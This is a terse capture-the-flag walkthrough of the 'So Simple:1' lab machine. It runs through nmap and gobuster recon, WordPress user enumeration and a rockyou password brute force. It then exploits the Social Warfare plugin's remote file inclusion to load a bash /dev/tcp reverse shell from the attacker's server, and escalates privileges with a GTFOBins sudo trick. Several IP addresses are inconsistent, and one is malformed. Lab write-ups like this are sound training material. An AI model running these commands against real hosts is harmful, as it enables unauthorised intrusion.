# So Simple:1

## Recon
1. Scanning

`nmap -sn -oA hostDiscovery 192.168.10.*`   -**used VirtualBox**

`nmap -T4 -O -A -sV -p- -sS -Pn -n -vvv -oA scan1 192.168.10.52`

![](1.png)

2. Enumeration

`gobuster dir -u http://192.168.10.52/ -w /usr/share/wordlists/dirb/common.txt`

`gobuster dir -u http://192.168.10.52/wordpress -w /usr/share/wordlists/dirb/common.txt`

![](2.png)

`wpscan --url "http://192.168.10.52/wordpress" --enumerate`

![](3.png)

now we brute forcing with username `max`

wpscan --url `"http://192.168.10.52/wordpress" -U max -p /usr/share/wordlist/rockyou.txt/`

![](4.png)

![](5.png)

**wordpress** has its own vuln database

search for ‘social warfare’ exploit
also we get some intersting

![](6.png)

3. Gaining Access

    1. setup the http server on my side

        `python3 -m http.server 80`


![](7.png)

`http://192.168.10.52/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.10.102/payload.txt`

![](8.png)

`bash -i >& /dev/tcp/192.168.56.102/8080 0>&1`

`<pre>system("bash -c 'bash -i >& /dev/tcp/192.168..102/8080 0>&1'")</pre>`

just refresh the webpage and get the shell

![](9.png)

![](10.png)

above string decoded but nothing get

we get max user's ssh key and logged in,

![](11.png)

Here we get the 1st user flag

![](12.png)


with help of `'usr/sbin/service'` we used GTFOBins

`sudo -u steven /usr/sbin/service ../../bin/bash`

and we get the steven shell.. also get the user flag.

![](13.png)

![](14.png)

 root flag is..

 ![](15.png)
